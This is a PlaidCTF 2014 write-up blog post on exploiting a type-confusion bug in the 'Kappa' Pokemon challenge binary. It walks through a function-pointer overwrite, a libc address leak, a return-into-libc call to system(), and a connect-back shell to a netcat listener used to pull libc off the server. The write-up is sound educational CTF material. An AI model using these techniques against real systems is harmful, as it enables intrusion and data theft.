---
id: 1879
title: 'PlaidCTF writeup for Pwn-275 &#8211; Kappa (type confusion vuln)'
date: '2014-04-18T16:27:59-05:00'
author: ron
layout: post
guid: 'https://blog.skullsecurity.org/?p=1879'
permalink: /2014/plaidctf-writeup-for-pwn-275-kappa-type-confusion-vuln
categories:
    - hacking
    - plaidctf-2014
    - re
---

Hey folks,

This is my last writeup for <a href='http://www.plaidctf.com'>PlaidCTF</a>! You can get a list of all my writeups <a href='/category/ctfs/plaidctf-2014'>here</a>. Kappa is a 275-point pwnable level called Kappa, and the goal is to capture a bunch of Pokemon and make them battle each other!

Ultimately, this issue came down to a type-confusion bug that let us read memory and call arbitrary locations. Let's see why!
<!--more-->
<h2>The setup</h2>

When you run <a href='https://blogdata.skullsecurity.org/kappa'>Kappa</a>, you get a Pokemon interface:

<pre>
Thank you for helping test CTF plays Pokemon! Keep in mind that this is currently in alpha which means that we will only support one person playing at a time. You will be provided with several options once the game begins, as well as several hidden options for those true CTF Plays Pokemon fans ;). We hope to expand this in the coming months to include even more features!  Enjoy! :)
Choose an Option:
1. Go into the Grass
2. Heal your Pokemon
3. Inpect your Pokemon
4. Release a Pokemon
5. Change Pokemon artwork
</pre>

If you go into the grass, you can capture a Pokemon:

<pre>
1   
You walk into the tall grass!
.
.
.
You failed to find any Pokemon!
Choose an Option:
1. Go into the Grass
2. Heal your Pokemon
3. Inpect your Pokemon
4. Release a Pokemon
5. Change Pokemon artwork

1
You walk into the tall grass!
.
.
.
A wild Kakuna appears!
Choose an Option:
1. Attack
2. Throw Pokeball
3. Run
2
You throw a Pokeball!
You successfully caught Kakuna!
What would you like to name this Pokemon?
POKEMON1
Choose an Option:
1. Go into the Grass
2. Heal your Pokemon
3. Inpect your Pokemon
4. Release a Pokemon
5. Change Pokemon artwork
</pre>

...And so on.

It's worth noting that each of those periods represents a second of waiting. Thus, the first thing to do is to get rid of sleep():

<pre>
<span class="Identifier">@@ -1,5 +1,5 @@</span>

<span class="Special">-kappa:     file format elf32-i386</span>
<span class="Statement">+kappa-fixed:     file format elf32-i386</span>


 Disassembly of section .interp:
<span class="Identifier">@@ -1077,19 +1077,35 @@</span>
  8048de9:      c7 04 24 74 98 04 08    mov    DWORD PTR [esp],0x8049874
  8048df0:      e8 9b f7 ff ff          call   8048590 &lt;puts@plt&gt;
  8048df5:      c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
<span class="Special">- 8048dfc:      e8 5f f7 ff ff          call   8048560 &lt;sleep@plt&gt;</span>
<span class="Statement">+ 8048dfc:      90                      nop</span>
<span class="Statement">+ 8048dfd:      90                      nop</span>
<span class="Statement">+ 8048dfe:      90                      nop</span>
<span class="Statement">+ 8048dff:      90                      nop</span>
<span class="Statement">+ 8048e00:      90                      nop</span>
  8048e01:      c7 04 24 92 98 04 08    mov    DWORD PTR [esp],0x8049892
  8048e08:      e8 83 f7 ff ff          call   8048590 &lt;puts@plt&gt;
  8048e0d:      c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
<span class="Special">- 8048e14:      e8 47 f7 ff ff          call   8048560 &lt;sleep@plt&gt;</span>
<span class="Statement">+ 8048e14:      90                      nop</span>
<span class="Statement">+ 8048e15:      90                      nop</span>
<span class="Statement">+ 8048e16:      90                      nop</span>
<span class="Statement">+ 8048e17:      90                      nop</span>
<span class="Statement">+ 8048e18:      90                      nop</span>
  8048e19:      c7 04 24 92 98 04 08    mov    DWORD PTR [esp],0x8049892
  8048e20:      e8 6b f7 ff ff          call   8048590 &lt;puts@plt&gt;
  8048e25:      c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1

</pre>
...and so on


<h2>Types, types, types</h2>

There are three types of Pokemon in the game: Bird Jesus, Kakuna, and Charizard. You can have up to four Pokemon captured at the same time. There is an array of the Pokemon types:

<pre>
<span class="Statement">.bss</span>:0<span class="Constant">804BFC0</span> <span class="Identifier">pokemon_types</span>   <span class="Identifier">dd</span> <span class="Constant">5</span> <span class="Identifier">dup</span>(?)             <span class="Comment">; DATA XREF: sub_8048960+219w</span>
<span class="Statement">.bss</span>:0<span class="Constant">804BFC0</span>                                         <span class="Comment">; do_heal_pokemon_real+20r ...</span>
<span class="Statement">.bss</span>:0<span class="Constant">804BFC0</span>                                         <span class="Comment">; A list of pokemon types, 1 2 or 3</span>
</pre>

...and also an array of pointers to the actual Pokemon:

<pre>
<span class="Statement">.bss</span>:0<span class="Constant">804BFAC</span> <span class="Identifier">pokemon_pointers</span> <span class="Identifier">dd</span> <span class="Constant">5</span> <span class="Identifier">dup</span>(?)            <span class="Comment">; DATA XREF: list_pokemon+1Er</span>
<span class="Statement">.bss</span>:0<span class="Constant">804BFAC</span>                                         <span class="Comment">; list_pokemon+2Cr ...</span>
                                                      <span class="Comment">; A list of pointers to the captured Pokemon</span>
</pre>

The structures for each Pokemon type are also different, and this is really the key:

<pre>
<span class="Constant">00000000</span> <span class="Identifier">pokemon_type_1</span>  <span class="Identifier">struc</span> <span class="Comment">; (sizeof=0x888)</span>
<span class="Constant">00000000</span> <span class="Identifier">name</span>            <span class="Identifier">db</span> <span class="Constant">15</span> <span class="Identifier">dup</span>(?)
<span class="Constant">0000000F</span> <span class="Identifier">artwork</span>         <span class="Identifier">db</span> <span class="Constant">2153</span> <span class="Identifier">dup</span>(?)
<span class="Constant">00000878</span> <span class="Identifier">health</span>          <span class="Identifier">dd</span> ?                    <span class="Comment">; XREF: do_heal_pokemon_real+5Bw ; max = 100</span>
<span class="Constant">0000087C</span> <span class="Identifier">attack_power</span>    <span class="Identifier">dd</span> ?
<span class="Constant">00000880</span> <span class="Identifier">actions</span>         <span class="Identifier">dd</span> ?
<span class="Constant">00000884</span> <span class="Identifier">function_status</span> <span class="Identifier">dd</span> ?                    <span class="Comment">; XREF: do_inspect_pokemon+79r</span>
<span class="Constant">00000888</span> <span class="Identifier">pokemon_type_1</span>  <span class="Identifier">ends</span>

<span class="Constant">00000000</span> <span class="Identifier">pokemon_type_2</span>  <span class="Identifier">struc</span> <span class="Comment">; (sizeof=0x214)</span>
<span class="Constant">00000000</span> <span class="Identifier">name</span>            <span class="Identifier">db</span> <span class="Constant">15</span> <span class="Identifier">dup</span>(?)
<span class="Constant">0000000F</span> <span class="Identifier">artwork</span>         <span class="Identifier">db</span> <span class="Constant">501</span> <span class="Identifier">dup</span>(?)
<span class="Constant">00000204</span> <span class="Identifier">health</span>          <span class="Identifier">dd</span> ?                    <span class="Comment">; XREF: do_heal_pokemon_real+80w</span>
<span class="Constant">00000208</span> <span class="Identifier">attack_power</span>    <span class="Identifier">dd</span> ?
<span class="Constant">0000020C</span> <span class="Identifier">actions</span>         <span class="Identifier">dd</span> ?
<span class="Constant">00000210</span> <span class="Identifier">function_status</span> <span class="Identifier">dd</span> ?                    <span class="Comment">; XREF: do_inspect_pokemon+A9r</span>
<span class="Constant">00000214</span> <span class="Identifier">pokemon_type_2</span>  <span class="Identifier">ends</span>

<span class="Constant">00000000</span> <span class="Identifier">pokemon_type_3</span>  <span class="Identifier">struc</span> <span class="Comment">; (sizeof=0x5FC)</span>
<span class="Constant">00000000</span> <span class="Identifier">name</span>            <span class="Identifier">db</span> <span class="Constant">15</span> <span class="Identifier">dup</span>(?)            <span class="Comment">; XREF: initialize_bird_jesus+18w</span>
<span class="Constant">0000000F</span> <span class="Identifier">artwork</span>         <span class="Identifier">db</span> <span class="Constant">1501</span> <span class="Identifier">dup</span>(?)          <span class="Comment">; XREF: initialize_bird_jesus+32o</span>
<span class="Constant">000005EC</span> <span class="Identifier">health</span>          <span class="Identifier">dd</span> ?                    <span class="Comment">; XREF: do_heal_pokemon_real+36w</span>
<span class="Constant">000005EC</span>                                         <span class="Comment">; initialize_bird_jesus+55w</span>
<span class="Constant">000005F0</span> <span class="Identifier">attack_power</span>    <span class="Identifier">dd</span> ?                    <span class="Comment">; XREF: initialize_bird_jesus+62w</span>
<span class="Constant">000005F4</span> <span class="Identifier">actions</span>         <span class="Identifier">dd</span> ?                    <span class="Comment">; XREF: initialize_bird_jesus+48w</span>
<span class="Constant">000005F8</span> <span class="Identifier">function_status</span> <span class="Identifier">dd</span> ?                    <span class="Comment">; XREF: do_inspect_pokemon+49r</span>
<span class="Constant">000005F8</span>                                         <span class="Comment">; initialize_bird_jesus+6Fw</span>
<span class="Constant">000005FC</span> <span class="Identifier">pokemon_type_3</span>  <span class="Identifier">ends</span>
</pre>

The three important fields are <tt>artwork</tt>, which is a differently sized array for each type, as well as <tt>actions</tt> and <tt>function_status</tt>. <tt>function_status</tt> is particular important, because it's a function pointer to the function that displays the Pokemon's status. And function pointers are fun. :)

<h2>Type confusion</h2>
Now, this is where the vulnerability happens. When you capture your sixth Pokemon, it no longer fits in the static 5-element array and asks you to replace one of your old ones:

<pre>
What would you like to name this Pokemon?
char
Caught char
Oh no! you don't have any more room for a Pokemon! Choose a Pokemon to replace!
Choose a Pokemon!
1. Bird Jesus
2. Kack1
3. Kack2
4. Kack3
5. Kack4
</pre>

The problem is, when a Pokemon updates a Pokemon of another type, <em>it forgets to update the type array</em>, and therefore thinks the Pokemon is of the wrong type! Since each type has a different structure, it means that Bad Stuff happens! If we change out a Pokemon then try to display it, this happens:

<pre>
What would you like to name this Pokemon?
char
Caught char
Oh no! you don't have any more room for a Pokemon! Choose a pokemon to replace!
Choose a Pokemon!
1. Bird Jesus
2. Kack1
3. Kack2
4. Kack3
5. Kack4
2

Choose an Option:
1. Go into the Grass
2. Heal your Pokemon
3. Inpect your Pokemon
4. Release a Pokemon
5. Change Pokemon artwork

3
Here are all of the stats on your current Pokemon!
Name: Bird Jesus
                   ..-`"-._
                 ,'      ,'`.
               ,f \   . / ,-'-.
              '  `. | |  , ,'`|
             `.-.  \| | ,.' ,-.\
              /| |. ` | /.'"||Y .
             . |_|U_\.|//_U_||. |
             | j    /   .    \ |'
              L    /     \    .j`
               .  `"`._,--|  //  \
               j   `.   ,'  , \   L
          ____/      `"'     \ L  |
       ,-'   ,'               \|'-+.
      /    ,'                  .    \
     /    /                     `    `.
    . |  j                       \     \
    |F   |                        '   \ .
    ||  F                         |   |\|
    ||  |                         |   | |
    ||  |                         |   | |
    `.._L                         |  ,' '
     .   |                        |,| ,'
      `  |                    '|||  j/
       `.'    .             ,'   /  '
         \\    `._        ,'    / ,'
          .\         ._ ,'     /,'
            .  ,   .'| \  (   //
            j_|'_,'  |  ._'` / `.
           ' |  |    |   |  Y    `.
    ,.__  `; |  |-"""^"""'  |.--""`
 ,--\   """ ,    \  / \ ,-     """"---.
'.--`v.=:.-'  .  L."`"'"\   ,  `.,.._ /`.
     .L    j-"`.   `\    j  |`.  "'--""`-'
     / |_,'    L ,-.|   (/`.)  `-\.-'\
    `-""        `. |     l /     `-"`-'
                  `      `- mh

Current Health: 960
Attack Power: 20
Attack: Gust
Segmentation fault (core dumped)
</pre>

Where did it crash?

<pre>
Core was generated by `./kappa-fixed'.
Program terminated with signal 11, Segmentation fault.
#0  0x22272020 in ?? ()
</pre>

0x22272020? That looks like ascii!

<pre>
$ echo -ne '\x20\x20\x27\x22'
  '"
</pre>

Space, space, single quote, double quote. That looks suspiciously like the ascii art we see above! And, in fact, it is! The <tt>artwork</tt> pointer of the Charizard we just caught overwrote the <tt>function_status</tt> pointer of the next Pokemon. Then, when we attempted to call <tt>function_status</tt>, it called some ascii art and crashed.

Here's what the memory layout is, essentially:

<pre>
          [lower addresses]                                                     [higher addresses]
          +--------------------------------------------------------------------------------------+
Kakuna:   |name|artworkar|health|power|actions|fcn_status| [...]                                 |
          +----+---------+------+-----+-------+----------+---------------------------------------+
          +----+---------+------+-----+-------+-----------+------+-----+-------+----------+------+
Charizard:|name|artworkartworkartworkartworkartworkartwork|health|power|actions|fcn_status| [...]|
          +----+------------------------------------------+------+-----+-------+----------+------+
          [lower addresses]                                                     [higher addresses]
</pre>

When the Kakuna is replaced by a Charizard, the program still thinks that the Pokemon is a charizard. Then, when it calls fcn_status(), it's actually calling an address pointer read from the artwork. If you look at the diagram above, you'll see that the same place that Kakuna stores its fcn_status pointer, Charizard stores its artwork.

The best part is, we can change the artwork! And therefore, we can change what Kakuna thinks is the function pointer! Check this out:

<pre>
Choose an Option:
1. Go into the Grass
2. Heal your Pokemon
3. Inpect your Pokemon
4. Release a Pokemon
5. Change Pokemon artwork

5
Choose a Pokemon!
1. Bird Jesus
2. char

3. 1

4. 1

5. 1

2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

I'm sure you'll love to show this new art to your friends!

Choose an Option:
1. Go into the Grass
2. Heal your Pokemon
3. Inpect your Pokemon
4. Release a Pokemon
5. Change Pokemon artwork

3
Here are all of the stats on your current Pokemon!
Name: Bird Jesus

[...ascii art...]

Current Health: 960
Attack Power: 20
Attack: Gust
Segmentation fault (core dumped)

$ gdb -q ./kappa-fixed ./core
Core was generated by `./kappa-fixed'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb)
</pre>

Sure enough, we can control the call (and therefore EIP) by overwriting the function pointer!

<h2>The deep blue libc</h2>

All right, we have EIP control, but that was only half the time I spent on this level! The other half was trying to figure out what to do with libc. Basically, I can cause a crash here:

<pre>
<span class="Statement">.text</span>:0<span class="Constant">8049075</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">esp</span>], <span class="Identifier">edx</span>
<span class="Statement">.text</span>:0<span class="Constant">8049078</span>                 <span class="Identifier">call</span>    <span class="Identifier">eax</span>
</pre>

Where 'edx' is a pointer to the full structure&mdash;the name, etc.&mdash;and eax is fully controlled. That means we can call an arbitrary function and pass an arbitrary string value as the first parameter. system(), anyone?

The first thing we tried was jumping to the heap. Suffice to say, that failed. So we had to be more clever and use a return-into-libc attack. The problem was, we didn't know where libc was!

Remember earlier when I said that <tt>actions</tt> was an important field? Well, the <tt>actions</tt> field, normally, is a pointer to the action that the Pokemon can take. Did you see under Bird Jesus's status where it said <tt>Attack: Gust</tt>? Well, that's reading a string pointed to by our struct. By using the same overflow we were using before, we can change where it reads that string from!

To put a kink in it, it's actually dereferenced before being read. Which means that whatever we point it to will be dereferenced then printed. So, it's a pointer to a string pointer. Meaning we can only read memory if we have a pointer to it!

For our attack, we need a pointer to libc. Luckily, we have the ever-handy Program Relocation Table sitting around, with calls such as this:

<pre>
<span class="Statement">.plt</span>:0<span class="Constant">8048510</span> <span class="Identifier">_read</span>           <span class="Identifier">proc</span> <span class="Identifier">near</span>               <span class="Comment">; CODE XREF: sub_8048960+1DCp</span>
<span class="Statement">.plt</span>:0<span class="Constant">8048510</span>                                         <span class="Comment">; do_change_artwork+5A6p</span>
<span class="Statement">.plt</span>:0<span class="Constant">8048510</span>                 <span class="Identifier">jmp</span>     <span class="Identifier">ds</span>:<span class="Identifier">off_804AEB4</span>
<span class="Statement">.plt</span>:0<span class="Constant">8048510</span> <span class="Identifier">_read</span>           <span class="Identifier">endp</span>
</pre>

The machine code for making that jump is actually FF 25 B8 AE 04 08. The last 4 bytes&mdash;B8 AE 04 08&mdash;refer to the address 0x0804aeb8. That address, in turn, stores the actual relocation address of the read() libc call! We chose read() because it happened to be the first one, and it just happened to be the one we grabbed. We could just of easily have used printf() or any other libc function.

To rephrase all that, we can set the Pokemon's action to a pointer to a string pointer. If we use 0x08048510+2, then we're setting it to a pointer to 0x804AEB4, which in turn is the read() libc call. Then when it tries to print, it's going to print the address of read() (and also printf() and some other functions) as a string, until it reaches a NUL byte!

Here's what it looks like:
<pre>
...
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE
Current Health: 69
Attack Power: 9999
Attack: P l\xB7\xB0\xC3d\xB7@Hg\xB70\x98g\xB7 Df\xB7f\x85
Name: Kack2
...
</pre>

Remember the series of 'A's is the altered artwork. And "P l\xb7" works out to "50 20 6c b7", or "0xb76c2050", a perfectly reasonable pointer to a libc function!

<h2>Pwnage</h2>

All right, we're just about done! We have an offset for libc's read() function, but what about system()?

This is where we cheated a bit. And by cheated, I mean use a common CTF technique: We stole a copy of libc from <a href='/2014/plaidctf-writeup-for-pwnage-200-a-simple-overflow-bug'>ezhp</a>'s level!

To do this, I re-exploited ezhp, and used connect-back shellcode to netcat that I had running. The netcat was logging into a file using the "tee" program:

<pre>
<span class="Identifier">nc</span> -<span class="Identifier">vv</span> -<span class="Identifier">l</span> -<span class="Identifier">p</span> <span class="Constant">55555</span> <span class="Comment">| tee libc.hex</span>
</pre>

Then once I'd exploited ezhp and gotten a shell back on that netcat instance, I used 'ldd' on ezhp's binary to find libc:

<pre>
<span class="Identifier">ldd</span> <span class="Identifier">ezhp</span>
        <span class="Identifier">linux</span>-<span class="Identifier">gate</span><span class="Statement">.so</span>.<span class="Constant">1</span> =&gt;  (<span class="Constant">0xb7759000</span>)
        <span class="Identifier">libc</span><span class="Statement">.so</span>.<span class="Constant">6</span> =&gt; /<span class="Identifier">lib</span>/<span class="Identifier">i686</span>/<span class="Identifier">cmov</span>/<span class="Identifier">libc</span><span class="Statement">.so</span>.<span class="Constant">6</span> (<span class="Constant">0xb7600000</span>)
        /<span class="Identifier">lib</span>/<span class="Identifier">ld</span>-<span class="Identifier">linux</span><span class="Statement">.so</span>.<span class="Constant">2</span> (<span class="Constant">0xb775a000</span>)
</pre>

Then printed libc.so.6 out in hex:

<pre>
xxd -g1 /lib/i686/cmov/libc.so.6 | head
0000000: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00  .ELF............
0000010: 03 00 03 00 01 00 00 00 00 6e 01 00 34 00 00 00  .........n..4...
0000020: fc 36 14 00 00 00 00 00 34 00 20 00 0a 00 28 00  .6......4. ...(.
0000030: 45 00 44 00 06 00 00 00 34 00 00 00 34 00 00 00  E.D.....4...4...
0000040: 34 00 00 00 40 01 00 00 40 01 00 00 05 00 00 00  4...@...@.......
...
</pre>

Then terminated the connection.

At this point, I had a fairly dirty libc.hex file. I opened it up in vim, removed everything except the hexdump, and saved it. Then I converted it back to binary:

<pre>
<span class="Identifier">xxd</span> -<span class="Identifier">r</span> &lt; <span class="Identifier">libc</span><span class="Statement">.hex</span> &gt; <span class="Identifier">libc</span><span class="Statement">.so</span>.<span class="Constant">6</span>
</pre>

And now I had a pretty typical libc.so copy from the server, and sure enough it was right! Once I had it, I calculated the offset between read() and system(), which turned out to be 0x8b500 bytes.

I then used the following pseudo-code:

<pre>
<span class="Identifier">return_address</span> = <span class="Identifier">read_address</span> - <span class="Constant">0x8b500</span>
</pre>

to calculate the return address. I set the name of my Pokemon to the command I wanted to run (since the name is the first argument passed into the function). And I ran it!

Because the name of the Pokemon was limited to 15 characters, I ended up using the command <tt>ls -lR /</tt> to find the flag, which gave me a 2.8mb directory listing of the server:

<pre>
$ <span class="Identifier">ls</span> -<span class="Identifier">lh</span> <span class="Identifier">dirlisting</span><span class="Statement">.txt</span>
-<span class="Identifier">rw</span>-<span class="Identifier">r</span>--<span class="Identifier">r</span>-- <span class="Constant">1</span> <span class="Identifier">ron</span> <span class="Identifier">ron</span> <span class="Constant">2</span>.<span class="Constant">8</span><span class="Identifier">M</span> <span class="Identifier">Apr</span> <span class="Constant">12</span> <span class="Constant">22</span>:<span class="Constant">47</span> <span class="Identifier">dirlisting</span><span class="Statement">.txt</span>
</pre>

Which turned out to be in /home/kappa/flag. Then, I printed it out using "cat ~kappa/f*".

And that was it!

<h2>Conclusion</h2>

So basically, we could cause the program to mix up the structure types. We used that to create an arbitrary indirect read, which we used to find the read() function, and therefore the system() function. Armed with that, we used the structure mix up to overwrite a function pointer and call system() with arbitrary commands!